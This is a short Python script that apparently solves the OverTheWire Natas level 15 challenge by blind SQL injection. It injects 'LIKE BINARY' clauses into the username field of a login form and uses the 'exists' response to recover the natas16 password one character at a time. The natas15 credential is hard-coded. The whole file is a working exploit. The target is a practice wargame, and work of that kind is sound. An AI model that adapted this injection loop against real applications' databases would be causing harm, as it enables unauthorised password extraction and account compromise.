import requests
import string


charset = ''.join(sorted(string.digits + string.ascii_letters))
neededchars = ''
password = ''

for c in charset:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + c + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=Data)
    #print(r.text)
    if( 'exists' in r.text):
        neededchars = neededchars + c

print(neededchars)
for i in range(0,32):
    for char in neededchars:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + password + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
        if 'exists' in r.text :
            password = password + char
            print(password)
            break

print(password)

